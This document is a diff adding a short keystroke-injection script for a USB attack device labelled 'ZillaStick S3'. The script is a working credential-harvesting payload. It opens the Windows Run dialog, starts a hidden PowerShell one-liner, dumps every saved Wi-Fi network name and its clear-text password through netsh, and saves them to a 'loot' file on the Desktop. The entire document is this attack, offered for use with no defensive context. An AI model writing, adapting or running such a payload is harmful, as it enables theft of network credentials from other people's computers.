@@ -1,0 +1,5 @@
+REM Red-branded PowerShell: grabs all saved WiFi SSIDs + passwords, saves to Desktop
+GUI r
+DELAY 800
+STRING powershell -nop -c "$host.ui.rawui.windowtitle='ZillaStick S3 | By Hackazillarex'; Write-Host '[*] ZillaStick S3 by Hackazillarex' -f Red; $out=@(); (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $p=($_ -split ': ')[1].Trim(); $k=(netsh wlan show profile name=$p key=clear | Select-String 'Key Content'); $pass=if($k){($k -split ': ')[1].Trim()}else{'<no password>'}; $out+=\"$p : $pass\" }; $out | Out-File $env:USERPROFILE\Desktop\zillastick_loot.txt; Write-Host '[+] Saved to Desktop\zillastick_loot.txt' -f Green; Start-Sleep 4"
+ENTER
